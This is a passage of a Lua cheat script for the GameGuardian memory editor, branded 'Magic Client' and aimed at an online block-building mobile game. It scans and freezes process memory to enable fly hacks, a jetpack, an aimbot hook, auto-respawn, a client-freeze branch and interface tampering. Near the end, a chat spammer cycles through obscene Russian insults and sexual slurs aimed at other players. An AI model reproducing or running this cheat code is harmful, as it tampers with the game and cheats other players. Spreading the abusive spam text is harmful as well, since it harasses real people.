,value=3},MainUI.Inventory,{address=MainUI['Fishing'].address+0x8A0+raznica,flags=2,freeze=true,value=82},{address=MainUI['Fishing'].address+0x8A2+raznica,flags=2,freeze=true,value=71},{address=MainUI['Fishing'].address+0x8A4+raznica,flags=2,freeze=true,value=66},{address=MainUI['Fishing'].address+0x8E8+raznica,flags=16,freeze=true,value=45},{address=MainUI['Fishing'].address+0x938+raznica,flags=16,freeze=true,value=-1},{address=MainUI['Fishing'].address+0x174,flags=16,freeze=true,value=1},{address=MainUI['Fishing'].address+0x154,flags=16,freeze=true,value=1},{address=MainUI['Fishing'].address+0x158,flags=16,freeze=true,value=0},{address=MainUI['Fishing'].address+0x15C,flags=16,freeze=true,value=0},MainUI['wzrd'],{address=MainUI['wzrd'].address+0x878+raznica,flags=4,freeze=true,value=26},{address=MainUI['wzrd'].address+0x8E8+raznica,flags=16,freeze=true,value=0},{address=MainUI['wzrd'].address+0x154,flags=16,freeze=true,value=0},{address=MainUI['wzrd'].address+0x158,flags=16,freeze=true,value=1},{address=MainUI['wzrd'].address+0x15C,flags=16,freeze=true,value=0},{address=MainUI['wzrd'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.458172458},{address=MainUI['wzrd'].address+0xA8,flags=16,freeze=true,value=Screen['X']*0.458172458},{address=MainUI['wzrd'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.188888889},{address=MainUI['wzrd'].address+0xAC,flags=16,freeze=true,value=Screen['Y']*0.188888889},MainUI['NullUI4'],MainUI['NullUI1'],MainUI['NullUI5'],MainUI['NullUI6'],MainUI['NullUI3'],MainUI['NullUI2'],{address=MainUI['NullUI1'].address+0x174,flags=16,freeze=true,value=0},{address=MainUI['NullUI1'].address+0xA4,flags=16,freeze=true,value=0},{address=MainUI['NullUI1'].address+0xA8,flags=16,freeze=true,value=0},{address=MainUI['NullUI1'].address+0xAC,flags=16,freeze=true,value=0},{address=MainUI['NullUI1'].address+0xA0,flags=16,freeze=true,value=0},{address=MainUI['NullUI5'].address+0x174,flags=16,freeze=true,value=0},{address=MainUI['NullUI5'].address+0xA4,flags=16,freeze=true,value=0},{address=MainUI['NullUI5'].address+0xA8,flags=16,freeze=true,value=0},{address=MainUI['NullUI5'].address+0xAC,flags=16,freeze=true,value=0},{address=MainUI['NullUI5'].address+0xA0,flags=16,freeze=true,value=0},{address=MainUI['NullUI2'].address+0x174,flags=16,freeze=true,value=0},{address=MainUI['NullUI2'].address+0xA4,flags=16,freeze=true,value=0},{address=MainUI['NullUI2'].address+0xA8,flags=16,freeze=true,value=0},{address=MainUI['NullUI2'].address+0xAC,flags=16,freeze=true,value=0},{address=MainUI['NullUI2'].address+0xA0,flags=16,freeze=true,value=0},{address=MainUI['NullUI3'].address+0x174,flags=16,freeze=true,value=0},{address=MainUI['NullUI3'].address+0xA4,flags=16,freeze=true,value=0},{address=MainUI['NullUI3'].address+0xA8,flags=16,freeze=true,value=0},{address=MainUI['NullUI3'].address+0xAC,flags=16,freeze=true,value=0},{address=MainUI['NullUI3'].address+0xA0,flags=16,freeze=true,value=0},{address=MainUI['NullUI6'].address+0x174,flags=16,freeze=true,value=0},{address=MainUI['NullUI6'].address+0xA4,flags=16,freeze=true,value=0},{address=MainUI['NullUI6'].address+0xA8,flags=16,freeze=true,value=0},{address=MainUI['NullUI6'].address+0xAC,flags=16,freeze=true,value=0},{address=MainUI['NullUI6'].address+0xA0,flags=16,freeze=true,value=0},{address=MainUI['NullUI4'].address+0x174,flags=16,freeze=true,value=0},{address=MainUI['NullUI4'].address+0xA4,flags=16,freeze=true,value=0},{address=MainUI['NullUI4'].address+0xA8,flags=16,freeze=true,value=0},{address=MainUI['NullUI4'].address+0xAC,flags=16,freeze=true,value=0},{address=MainUI['NullUI4'].address+0xA0,flags=16,freeze=true,value=0},{address=MainUI['NullUI7'].address+0x174,flags=16,freeze=true,value=0},{address=MainUI['NullUI7'].address+0xA4,flags=16,freeze=true,value=0},{address=MainUI['NullUI7'].address+0xA8,flags=16,freeze=true,value=0},{address=MainUI['NullUI7'].address+0xAC,flags=16,freeze=true,value=0},{address=MainUI['NullUI7'].address+0xA0,flags=16,freeze=true,value=0},{address=MainUI['NullUI8'].address+0x174,flags=16,freeze=true,value=0},{address=MainUI['NullUI8'].address+0xA4,flags=16,freeze=true,value=0},{address=MainUI['NullUI8'].address+0xA8,flags=16,freeze=true,value=0},{address=MainUI['NullUI8'].address+0xAC,flags=16,freeze=true,value=0},{address=MainUI['NullUI8'].address+0xA0,flags=16,freeze=true,value=0},MainUI['wzrd3'],{address=MainUI['Fly'].address + 0xA0,flags=16,freeze=true,value=Screen['X']*0.945945946},{address=MainUI['Fly'].address + 0xA4,flags=16,freeze=true,value=Screen['Y']*0.590277778},{address=MainUI['Fly'].address + 0xA8,flags=16,freeze=true,value=(Screen['X']*0.945945946)+60},{address=MainUI['Fly'].address + 0xAC,flags=16,freeze=true,value=(Screen['Y']*0.590277778)+60},MainUI['FlyEffect'],{address=MainUI['FlyEffect'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.935006435},{address=MainUI['FlyEffect'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.479166667},{address=MainUI['FlyEffect'].address+0xA8,flags=16,freeze=true,value=(Screen['X']*0.935006435)+100},{address=MainUI['FlyEffect'].address+0xAC,flags=16,freeze=true,value=(Screen['Y']*0.479166667)+110},MainUI['Glide'],{address=MainUI['Glide'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.907335907},{address=MainUI['Glide'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.316666667},{address=MainUI['Glide'].address+0xA8,flags=16,freeze=true,value=(Screen['X']*0.907335907)+60},{address=MainUI['Glide'].address+0xAC,flags=16,freeze=true,value=(Screen['Y']*0.316666667)+60},{address=MainUI['Glide'].address+0x174,flags=16,freeze=true,value=0},MainUI['Krest'],MainUI['MainKR'],MainUI['BtnAttack'],MainUI['BtnAttackImg'],MainUI['SkillMain'],MainUI['SkillBtn'],{address=MainUI['SkillBtn'].address+0xC,flags=2,freeze=true,value=0},{address=MainUI['SkillBtn'].address+0x144,flags=16,freeze=true,value=1},{address=MainUI['SkillBtn'].address+0x148,flags=16,freeze=true,value=0},{address=MainUI['SkillBtn'].address+0x14C,flags=16,freeze=true,value=1},MainUI['SkillEffect'],{address=MainUI['FreeCamUnlock'].address+0xB0,flags=1,freeze=true,value=1},{address=MainUI['FreeCamLock'].address+0xB0,flags=1,freeze=true,value=1},{address=MainUI['FreeCamStatus'].address+0xB0,flags=1,freeze=true,value=1},{address=MainUI['Fishing'].address+0xB0,flags=1,freeze=true,value=1},{address=MainUI['NickSize'].address+0xB0,flags=1,freeze=true,value=1},{address=MainUI['BtnAttack'].address+0x810+raznica,flags=4,freeze=true,value=0},{address=MainUI.TP.address+0x144,flags=16,freeze=true,value=1},{address=MainUI.TP.address+0x148,flags=16,freeze=true,value=0},{address=MainUI.TP.address+0x14C,flags=16,freeze=true,value=0},MainUI.BtnAttackMain,{address=MainUI.Krug.address+0x144,flags=16,freeze=true,value=1},{address=MainUI.Krug.address+0x148,flags=16,freeze=true,value=0},{address=MainUI.Krug.address+0x14c,flags=16,freeze=true,value=0},{address=MainUI.Krug2.address+0x144,flags=16,freeze=true,value=1},{address=MainUI.Krug2.address+0x148,flags=16,freeze=true,value=0},{address=MainUI.Krug2.address+0x14c,flags=16,freeze=true,value=0},{address=MainUI.Inventory.address+0x144,flags=16,freeze=true,value=1},{address=MainUI.Inventory.address+0x148,flags=16,freeze=true,value=0},{address=MainUI.Inventory.address+0x14c,flags=16,freeze=true,value=0},MainUI.WarBlock,{address=MainUI.WarBlock.address+0xA0,flags=16,freeze=true,value=Screen.X*0.907335907},{address=MainUI.WarBlock.address+0xA8,flags=16,freeze=true,value=Screen.X*0.907335907+60},{address=MainUI.WarBlock.address+0xA4,flags=16,freeze=true,value=Screen.Y*0.232638889},{address=MainUI.WarBlock.address+0xAC,flags=16,freeze=true,value=Screen.Y*0.232638889+60},{address=MainUI.WarBlock.address+0x144,flags=16,freeze=true,value=1},{address=MainUI.WarBlock.address+0x148,flags=16,freeze=true,value=0},{address=MainUI.WarBlock.address+0x14c,flags=16,freeze=true,value=0},Main10.Mat1,Main10.Mat2,{address=Main10.Mat1.address+0x144,flags=16,freeze=true,value=1},{address=Main10.Mat1.address+0x148,flags=16,freeze=true,value=0},{address=Main10.Mat1.address+0x14c,flags=16,freeze=true,value=1},{address=Main10.Mat2.address+0x144,flags=16,freeze=true,value=1},{address=Main10.Mat2.address+0x148,flags=16,freeze=true,value=0},{address=Main10.Mat2.address+0x14c,flags=16,freeze=true,value=0},{address=MainUI.GunReload.address+0xb0,flags=1,freeze=true,value=1},{address=MainUI.GunReload.address+0xa0,flags=16,freeze=true,value=Screen.X*0.945945946},{address=MainUI.GunReload.address+0xa8,flags=16,freeze=true,value=Screen.X*0.945945946+60},{address=MainUI.GunReload.address+0xa4,flags=16,freeze=true,value=Screen.Y*0.232638889},{address=MainUI.GunReload.address+0xac,flags=16,freeze=true,value=Screen.Y*0.232638889+60},{address=MainUI.wzrdIcon.address+0xb0,flags=1,freeze=true,value=1},{address=MainUI.wzrdIcon.address+0xa0,flags=16,freeze=true,value=Screen.X*0.953271028},{address=MainUI.wzrdIcon.address+0xa8,flags=16,freeze=true,value=Screen.X*0.953271028+40},{address=MainUI.wzrdIcon.address+0xa4,flags=16,freeze=true,value=Screen.Y*0.25},{address=MainUI.wzrdIcon.address+0xac,flags=16,freeze=true,value=Screen.Y*0.25+40},{address=MainUI.wzrdIcon.address+0x144,flags=16,freeze=true,value=1},{address=MainUI.wzrdIcon.address+0x148,flags=16,freeze=true,value=0},{address=MainUI.wzrdIcon.address+0x14c,flags=16,freeze=true,value=0},{address=MainUI.wzrdIcon.address+0xc,flags=2,freeze=true,value=0},MainUI.wzrdIcon,Main10.gg11,{address=MainUI['ServTime'].address+0x154,flags=16,freeze=true,value=0},{address=MainUI['ServTime'].address+0x158,flags=16,freeze=true,value=1},{address=MainUI['ServTime'].address+0x15C,flags=16,freeze=true,value=0},{address=MainUI['ServTime'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.0249221184},{address=MainUI['ServTime'].address+0xA8,flags=16,freeze=true,value=Screen['X']*0.0249221184},{address=MainUI['ServTime'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.9375},{address=MainUI['ServTime'].address+0xAC,flags=16,freeze=true,value=Screen['Y']*0.9375},MainUI['MyTime'],{address=MainUI['MyTime'].address+0x878+raznica,flags=4,freeze=true,value=0},{address=MainUI['MyTime'].address+0x154,flags=16,freeze=true,value=0},{address=MainUI['MyTime'].address+0x158,flags=16,freeze=true,value=1},{address=MainUI['MyTime'].address+0x15C,flags=16,freeze=true,value=0},{address=MainUI['MyTime'].address+0xA0,flags=16,freeze=true,value=Screen['X']*0.74002574},{address=MainUI['MyTime'].address+0xA8,flags=16,freeze=true,value=Screen['X']*0.74002574},{address=MainUI['MyTime'].address+0xA4,flags=16,freeze=true,value=Screen['Y']*0.902},{address=MainUI['MyTime'].address+0xAC,flags=16,freeze=true,value=Screen['Y']*0.902},MainUI.tgwzrd,{address=MainUI.tgwzrd.address+0xA0,flags=16,freeze=true,value=Screen.X*0.418275418},{address=MainUI.tgwzrd.address+0xA8,flags=16,freeze=true,value=Screen.X*0.418275418},{address=MainUI.tgwzrd.address+0xA4,flags=16,freeze=true,value=Screen.Y*0.23},{address=MainUI.tgwzrd.address+0xAC,flags=16,freeze=true,value=Screen.Y*0.23},{address=MainUI.tgwzrd.address+0x154,flags=16,freeze=true,value=0},{address=MainUI.tgwzrd.address+0x158,flags=16,freeze=true,value=1},{address=MainUI.tgwzrd.address+0x15c,flags=16,freeze=true,value=1},{address=UI2[1].address+0xA4,flags=16,freeze=true,value=Screen.Y*0.243055556},{address=UI2[1].address+0xAC,flags=16,freeze=true,value=Screen.Y*0.243055556+40},{address=MainUI.tgwzrd.address+0x938+raznica,flags=16,freeze=true,value=-1},{address=MainUI.tgwzrd.address+0x878+raznica,flags=4,freeze=true,value=34}}
nofallval,swimst,SkillAt=0,0,0
Main10.Glide=MainUI.Glide
wizard,wizard2,wizard3,wizardtg={},{},{},{}--0,74002574
timeground=0
WizardBG2='Magic Client ▢FFFF00FFv1.3'
WizardTG='Telegram:▢FF0000FF@MagicFromWizard'
if MainUI.DarkMask then
mainspisok.wizardbp={address=MainUI.DarkMask.address+0x470,flags=16,freeze=true,value=0}
end
gg.clearResults()gg.clearList()gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)
gg.searchNumber(';ArmorPanel-Inventory-Radio-All',2,_,_,MainUI.InvPanel.address-0x100000,MainUI.InvPanel.address+0x100000)gg.refineNumber(';A',2)MainUI.Inv=gg.getResults(1)[1] if MainUI.Inv then gg.clearResults() MainUI.Inv={address=MainUI.Inv.address+0x48,flags=4,freeze=true,value=257} mainspisok.inv1,mainspisok.inv2,mainspisok.inv3={address=MainUI.Inv.address+0x144,flags=16,freeze=true,value=0},{address=MainUI.Inv.address+0x148,flags=16,freeze=true,value=1},{address=MainUI.Inv.address+0x14c,flags=16,freeze=true,value=0} end  
if myGameType=='1026' and myMap=='m1026_1' and MainUI.ContainerChat then
gg.setRanges(wzrdrg | 8 | 16 | 262144 | 32)gg.clearResults()gg.searchNumber(';ToolBar-Real-Time-Rank-Btn',2,_,_,MainUI.ContainerChat.address-0x20000000,MainUI.ContainerChat.address+0x20000000)::wzrdtp::gg.refineNumber(';To',2)gg.refineNumber(';T',2)local t=gg.getResults(1488)gg.clearResults()
for i=1,#t do
t[i].address=t[i].address+0x48 t[i].flags=4
end
gg.loadResults(t)gg.refineNumber('1~257',4)if gg.getResultsCount()~=0 then MainUI.TPTNT={address=gg.getResults(1)[1].address,flags=4,freeze=true,value=257}gg.clearResults()

mainspisok.TPTNT1={address=MainUI.TPTNT.address+0x144,flags=16,freeze=true,value=0}
mainspisok.TPTNT2={address=MainUI.TPTNT.address+0x148,flags=16,freeze=true,value=0}
mainspisok.TPTNT3={address=MainUI.TPTNT.address+0x14C,flags=16,freeze=true,value=0}

mainspisok.TPTNT1t={address=MainUI.TPTNT.address+0x154,flags=16,freeze=true,value=1}
mainspisok.TPTNT2t={address=MainUI.TPTNT.address+0x158,flags=16,freeze=true,value=0}
mainspisok.TPTNT3t={address=MainUI.TPTNT.address+0x15C,flags=16,freeze=true,value=0}

mainspisok.TPTNT1upd={address=MainUI.TPTNT.address+0x940,flags=16,freeze=true,value=-1}
mainspisok.TPTNT2s={address=MainUI.TPTNT.address+0x8e8+raznica,flags=16,freeze=true,value=25}
mainspisok.TPTNT3t2={address=MainUI.TPTNT.address+0x878+raznica,flags=4,freeze=true,value=2}
mainspisok.TPTNT2tt={address=MainUI.TPTNT.address+0x8a0+raznica,flags=2,freeze=true,value=';T'}
mainspisok.TPTNT2p={address=MainUI.TPTNT.address+0x8a2+raznica,flags=2,freeze=true,value=';P'}
mainspisok.TPTNT2x={address=MainUI.TPTNT.address+0xa0,flags=16,freeze=true,value=Screen.X*0.868725869}
mainspisok.TPTNT2x2={address=MainUI.TPTNT.address+0xa8,flags=16,freeze=true,value=Screen.X*0.868725869+60}
mainspisok.TPTNT2y={address=MainUI.TPTNT.address+0xa4,flags=16,freeze=true,value=Screen.Y*0.15}
mainspisok.TPTNT2y2={address=MainUI.TPTNT.address+0xac,flags=16,freeze=true,value=Screen.Y*0.15+60}
Main10.TPTNT={address=MainUI.TPTNT.address+0xA18+raznica,flags=1,freeze=true,value=0}
else penis228=true end end


if not BASGame then
if BasicGames1 then
mainspisok.nf1,mainspisok.nf2,mainspisok.nf3={address=UI7[1].address+0x144,flags=16,freeze=true,value=0},{address=UI7[1].address+0x148,flags=16,freeze=true,value=0.5},{address=UI7[1].address+0x14C,flags=16,freeze=true,value=0}
else
mainspisok.nf1,mainspisok.nf2,mainspisok.nf3,mainspisok.nf4,mainspisok.nf5={address=UI7[1].address+0x144,flags=16,freeze=true,value=1},{address=UI7[1].address+0x148,flags=16,freeze=true,value=0},{address=UI7[1].address+0x14C,flags=16,freeze=true,value=0},{address=UI7[1].address+0x14C,flags=16,freeze=true,value=0},{address=UI7[1].address+0x878+raznica,flags=4,freeze=true,value=0},{address=UI7[1].address+0x940,flags=16,freeze=true,value=-1}end
else
mainspisok.nf1,mainspisok.nf2,mainspisok.nf3,mainspisok.nf4,mainspisok.nf5,mainspisok.nf6,mainspisok.nf7,mainspisok.nf8,mainspisok.nf9,mainspisok.nf10,mainspisok.nf11,mainspisok.nf12,mainspisok.nf13,mainspisok.nf14,mainspisok.nf15,mainspisok.nf16={address=UI7[1].address+0x144,flags=16,freeze=true,value=0},{address=UI7[1].address+0x148,flags=16,freeze=true,value=0},{address=UI7[1].address+0x14C,flags=16,freeze=true,value=0},{address=UI7[1].address+0x154,flags=16,freeze=true,value=1},{address=UI7[1].address+0x158,flags=16,freeze=true,value=0},{address=UI7[1].address+0x15C,flags=16,freeze=true,value=0},{address=UI7[1].address+0x878+raznica,flags=4,freeze=true,value=6},{address=UI7[1].address+0x8e8+raznica,flags=16,freeze=true,value=55},{address=UI7[1].address+0x8a0+raznica,flags=2,freeze=true,value=';U'},{address=UI7[1].address+0x8a2+raznica,flags=2,freeze=true,value=';n'},{address=UI7[1].address+0x8a4+raznica,flags=2,freeze=true,value=';d'},{address=UI7[1].address+0x8a6+raznica,flags=2,freeze=true,value=';e'},{address=UI7[1].address+0x8a8+raznica,flags=2,freeze=true,value=';a'},{address=UI7[1].address+0x8aa+raznica,flags=2,freeze=true,value=';d'},{address=UI7[1].address+0x940+raznica,flags=16,freeze=true,value=0.7},{address=UI7[1].address+0x944+raznica,flags=16,freeze=true,value=0.7}
end

for i in EngineVer:gmatch(utf8.charpattern) do
  t = utf8.codepoint(i)
  table.insert(wizard,t)
end
for i in WizardBG:gmatch(utf8.charpattern) do
  t = utf8.codepoint(i)
  table.insert(wizard2,t)
end
for i in WizardBG2:gmatch(utf8.charpattern) do
  t = utf8.codepoint(i)
  table.insert(wizard3,t)
end
for i in WizardTG:gmatch(utf8.charpattern) do
  t = utf8.codepoint(i)
  table.insert(wizardtg,t)
end
t=0
for b = 1,WizardUtf8.len(EngineVer) do
table.insert(mainspisok,{['address']=MainUI['EngineVersion'].address+0x8A0+raznica+t,['flags']=2,['freeze']=true,['value']=wizard[b]})t=t+2
end
t=0
for b = 1,WizardUtf8.len(WizardTG) do
table.insert(mainspisok,{['address']=MainUI['tgwzrd'].address+0x8A0+raznica+t,['flags']=2,['freeze']=true,['value']=wizardtg[b]})t=t+2
end
t=0


for b = 1,WizardUtf8.len(WizardBG2) do
table.insert(mainspisok,{['address']=MainUI['wzrd'].address+0x8A0+raznica+t,['flags']=2,['freeze']=true,['value']=wizard3[b]})t=t+2
end
t=0
for b = 1,WizardUtf8.len(WizardBG) do
table.insert(mainspisok,{['address']=MainUI['App'].address+0x8A0+raznica+t,['flags']=2,['freeze']=true,['value']=wizard2[b]})t=t+2
end
if BASGame then
mainspisok.invX1,mainspisok.invX2,mainspisok.invY1,mainspisok.invY2={address=MainUI.Inventory.address+0xA0,flags=16,freeze=true,value=Screen.X*0.685358255},{address=MainUI.Inventory.address+0xA8,flags=16,freeze=true,value=Screen.X*0.685358255+60},{address=MainUI.Inventory.address+0xA4,flags=16,freeze=true,value=Screen.Y*0.888888889},{address=MainUI.Inventory.address+0xAc,flags=16,freeze=true,value=Screen.Y*0.888888889+80}
end
if #skyBlockShit~=0 then
gg.clearResults()
gg.loadResults(skyBlockShit)
gg.refineNumber(257,4)
if #gg.getResults(1)~=0 then
table.insert(mainspisok,{address=gg.getResults(1)[1].address,flags=4,freeze=true,value=1})
if MainUI['SkyBlockShit'] then
 table.insert(mainspisok,{address=MainUI['SkyBlockShit'].address+0x9C,flags=16,freeze=true,value=0}) gg.clearResults() end end end
 if JetPackSt == '⚠️' and not jetres then
 gg.setRanges(16384 | 8)gg.clearResults()gg.clearList()gg.setVisible(false)gg.searchNumber(1441152057758185640,32)
local t=gg.getResults(1)
 if #t~=0 then
 mainspisok.jetpack,jetres={address=gg.getResults(1)[1].address+0x2c,flags=1,freeze=true,value=0},true end gg.clearResults()
 else
mainspisok.jetpack,mainspisok.jetpack2,mainspisok.resst={address=wizard088+4,flags=1,freeze=true,value=1},{address=Mag6[1].address+0x27c,flags=1,freeze=true,value=0},{address=wizard086+4,flags=1,freeze=true,value=1}
 end
 mainspisok.flydev,mainspisok.flydevspeed={address=Mag6[1].address+0x544,flags=16,freeze=true,value=0.5},{address=Mag6[1].address+0x53c,flags=16,freeze=true,value=0.5}
defspisok=gg.getValues(mainspisok)for i=1,#defspisok do defspisok[i].freeze=true end gg.addListItems(mainspisok)gg.sleep(999)gg.addListItems({{address=MainUI['wizardtnt4'].address,flags=4,freeze=true,value=1},{address=MainUI['Krest'].address,flags=4,freeze=true,value=1}})gg.clearList()NickSizeVal=0 MainXa(16,0,1.62)Main10.SCR1={address=UI4[1].address+0xa0,flags=16}Main10.SCR2={address=UI4[1].address+0xa8,flags=16}
end
setCopyID()
function checkGG228()
Open = gg.getValues(Main10)
currenttime=os.clock()
if not rgbtimeok then
rgbtimeok=Open.ServerTime.value
end
if rgbtimeok+25<Open.ServerTime.value then
rgbtimeok=Open.ServerTime.value
r120,g120,b120=RGBManager(_,false)
end

if NickSizeVal~=Open['NickSize'].value then
NickSizeVal,ChangeNickSize=Open['NickSize'].value,true
end
if Open['Ground'].value==257 then
timeground=timeground+1
elseif Open['Ground'].value~=257 then
timeground=0
end
if swimst~=Open['SwimST'].value then
swimst,swimst2=Open['SwimST'].value,true end
if nofallval~=Open['Paraplane'].value then
nofallval,nofallst=Open['Paraplane'].value,true
end
if CurrentAnimVal~=Open['CurrentAnim'].value then
CurrentAnimVal,ChangeShowAnim=Open['CurrentAnim'].value,true
end
if Open['Fly'].value==0 then
FlyDevST=false
else FlyDevST=true end
if Open.gg11.value~=1 then
local t={{address=MainUI.time1.address,flags=4,freeze=true,value=0},{address=MainUI.time2.address,flags=4,freeze=true,value=0},{address=MainUI.time3.address,flags=4,freeze=true,value=0}}
gg.addListItems(t)gg.clearList()
end
if Open['Game'].value==0 or Open.ServerTime.value==0 then
--gg.addListItems(defspisok)gg.clearList()ar123=nil
rebornMenu() setCopyID() gg.addListItems({MainUI['UpdateMain']})
gg.clearList() wzrdgun,rgbtimeok,defaultGuns,wzrdguns=nil,0,nil,nil
elseif Open.SCR2.value-Open.SCR1.value>61 then
gg.addListItems(mainspisok)gg.sleep(999)gg.addListItems({{address=MainUI['wizardtnt4'].address,flags=4,freeze=true,value=1},{address=MainUI['Krest'].address,flags=4,freeze=true,value=1}})gg.clearList()
elseif Open.gg11.value==1 then
tsp={}
if gg.isVisible(true) or Open['Menu'].value == 1 then
gg.setVisible(false)
GameCountSystem()gg.addListItems({{address=MainUI.btmtext2.address,flags=4,freeze=true,value=1},{address=MainUI.btmtext.address,flags=4,freeze=true,value=1}})gg.clearList()
MagicMenu()
end
if AutoRespawn and Open['HP'].value<0.123 and timeresp+3000<Open.ServerTime.value then
timeresp=Open.ServerTime.value
tsp['resp']=AutoRespawnVal
end
if (Open.HB1.value>0.6 or Open.HB1.value<0.5) or (Open.HB2.value>0.6 or Open.HB2.value<0.5)or(Open.HB3.value>1.8 or Open.HB3.value<1.7) then
tsp.hb1,tsp.hb2,tsp.hb3=Main10.HB1,Main10.HB2,Main10.HB3
end
if Open.Fun.value==1 then
tsp.fun1,tsp.fun2={address=Main10.Fun.address,flags=1,freeze=true,value=0},{address=Main10.GunPreviewCheckBox.address+0x1420+raznica,flags=1,freeze=true,value=0}
Actions()
end
if Open.GunPreviewCheckBox.value~=257 then
tsp.funback=Main10.GunPreviewCheckBox
end

if Open['Client'].value~=w60 or Open['1.62'].value~=1.6200000047683716 then
clientChecker()
SosiHuy()
if aimbotst1 then
max=nil
lap1()
end
t=nil
if JetPackSt ~= '⚠️' then
wiz1 = true
JetPack()
wiz1 = nil
end
tsp.flyhack1={address=Mag6[1].address+0x544,flags=16,freeze=true,value=0.5}
tsp.flyhacksp={address=Mag6[1].address+0x53c,flags=16,freeze=true,value=lastFlySp}
if clothes then
local t=Mag6[1].address
tsp.cl1,tsp.cl2,tsp.cl3,tsp.cl4,tsp.cl5,tsp.cl6,tsp.cl7,tsp.cl8,tsp.cl9,tsp.cl10,tsp.cl11,tsp.cl12={address=t+0x53c,flags=4,freeze=true,value=clothes[1]},{address=t+0x534,flags=4,freeze=true,value=clothes[2]},{address=t+0x540,flags=4,freeze=true,value=clothes[3]},{address=t+0x538,flags=4,freeze=true,value=clothes[4]},{address=t+0x614,flags=4,freeze=true,value=clothes[5]},{address=t+0x528,flags=4,freeze=true,value=clothes[6]},{address=t+0x52C,flags=4,freeze=true,value=clothes[7]},{address=t+0x524,flags=4,freeze=true,value=clothes[8]},{address=t+0x530,flags=4,freeze=true,value=clothes[9]},{address=t+0x520,flags=4,freeze=true,value=clothes[10]},{address=t+0x580,flags=4,freeze=true,value=clothes[11]},{address=t+0x4b0,flags=1,freeze=true,value=1}
end
MainUI.Wizard1488.value=-99999999
tsp.val1488=MainUI.Wizard1488
end
if not MySkin then
MySkin={Open.Wings.value,Open['Очки'].value,Open['Шляпа'].value,Open['Шарф'].value,Open['Хвост'].value,Open['Футболка'].value,Open['Штаны'].value,Open['Волосы'].value,Open['Обувь'].value,Open['Лицо'].value,Open['Корона'].value}
end
if (not btmt or btmt+250<Open.ServerTime.value) and btmtext then
tsp.offui1={address=MainUI.btmtext.address,flags=4,freeze=true,value=1}btmtext=nil
end
if (not btmt2 or btmt2+250<Open.ServerTime.value) and btmtext2 then
tsp.offui2={address=MainUI.btmtext2.address,flags=4,freeze=true,value=1}btmtext2=nil
end
if parachuteST and Open.ParachuteCR.value~=1 then
parachuteST=nil
elseif not parachuteST and Open.ParachuteCR.value==1 then
parachuteST=true
end
if Open['Wings'].value==3000 and not parachuteST then
tsp.parac1,tsp.parac2={address=Mag6[1].address+0x604,flags=4,freeze=true,value=0},{address=Mag6[1].address+0x578,flags=1,freeze=true,value=1}
elseif Open['Wings'].value~=3000 and parachuteST then
tsp.parac1,tsp.parac2={address=Mag6[1].address+0x604,flags=4,freeze=true,value=3000},{address=Mag6[1].address+0x578,flags=1,freeze=true,value=1}
end
if NoTeam==0 then
if Open.TeamId.value==0 then
NoTeam=true
else
NoTeam=nil
end
end
if not MyGender then
if Open.Gender.value==1 then
MyGender='♂️'
WomenActor=0
if eng1 then
gender = "Boy♂️"
else
gender = "Мужской♂️"
end
else
MyGender='♀️'
WomenActor=1
if eng1 then
gender = "Girl♀️"
else
gender = "Женский♀️"
end
end
Open.Gender=nil
end

if Open.Wizard1488.value<0 and (not time1488 or time1488+100<Open.ServerTime.value) then
time1488=Open.ServerTime.value
MainUI.Wizard1488.value=1
tsp.val1488=MainUI.Wizard1488
elseif Open.ClientFreeze.value==0 and Open.Wizard1488.value>0 and (not time1488 or time1488+1000<Open.ServerTime.value) then
time1488=Open.ServerTime.value
MainUI.Wizard1488.value=-99999999
tsp.val1488=MainUI.Wizard1488
end

if Open.ParachuteUI.value~=257 then
tsp.backUI1=UI7[1]
end
if red089 then
if IsLife then
local x,y,z=math.floor(Open['X'].value + 0.5),math.floor(Open['Y'].value + 0.5),math.floor(Open['Z'].value + 0.5)
local x,y,z,fps,ping=string.format("%d", x),string.format("%d", y),string.format("%d", z),Open.FPS.value,Open.Ping.value
if not btmt or btmt+40<Open.ServerTime.value then
btmt=Open.ServerTime.value
bottomText('XYZ:'..x..'/'..y..'/'..z..', FPS:'..fps..', PING:'..ping,{r120,g120,b120})
end
chh=0 end
if r089 then
red089=red089-0.001
else
red089=red089+0.001
end
if red089>=1 then
r089=true
elseif red089<=0.7 then
r089=nil
end
tsp.w089,tsp.w088,tsp.w189={address=UI4[1].address+0x154,flags=16,freeze=true,value=red089},{address=MainUI.Krug.address+0x144,flags=16,freeze=true,value=red089},{address=MainUI.Krug2.address+0x144,flags=16,freeze=true,value=red089}
if rgb120 then
tt={}
for i in rgb120:gmatch(utf8.charpattern) do
  t = utf8.codepoint(i)
  table.insert(tt,t)
end
t=0
for b = 1,6 do
tsp['updtg'..b]={['address']=MainUI['tgwzrd'].address+0x8c0+t,['flags']=2,['freeze']=true,['value']=tt[b]}t=t+2
end
tsp.updtgm={['address']=MainUI['tgwzrd'].address+0x938+raznica,['flags']=16,['freeze']=true,['value']=-1}
end
end
if (Open.ClientFreeze.value>100000) and BASGame then
tsp.killClient,tsp.killClient2={address=Mag1[1].address-0xA4,flags=16,freeze=true,value=0},{address=Mag1[1].address-0xb0,flags=16,freeze=true,value=1.8}
end

if bypassBed and (Open.Ground.value~=257 or Open.FlyActive.value==1)then
--[[Main10.BedWarBP.value=0
tsp.bpbed=Main10.BedWarBP]]
end
if bypassBed and Open.Ground.value==257 and Open.FlyActive.value==0 then
--[[Main10.BedWarBP.value=5
tsp.bpbed=Main10.BedWarBP]]
end

if spammerwz then
local colorsp='^'..rgb120
if spamtm<=200 then
textsp228='cocu xyù мрaзь ebаная'
elseif spamtm<=400 then
textsp228='я твою mатb ebal в рот'
elseif spamtm<=600 then
textsp228='терпи дальше бездарь'
elseif spamtm<=800 then
textsp228='глотай сперму pidor'
elseif spamtm<=1000 then
textsp228='тупая шлюxa cocu хуú'
elseif spamtm<=1200 then
textsp228='ты—сынок гoвнoвоза'
elseif spamtm<=1400 then
textsp228='закрой еbучку шлюxa'
elseif spamtm<=1600 then
textsp228='Я—бог могучий,соcu xуú'
elseif spamtm<=1800 then
textsp228='выскажись в мой xуú'
elseif spamtm<=2000 then
textsp228='еbyчая псина cocu xуú'
elseif spamtm<=2200 then
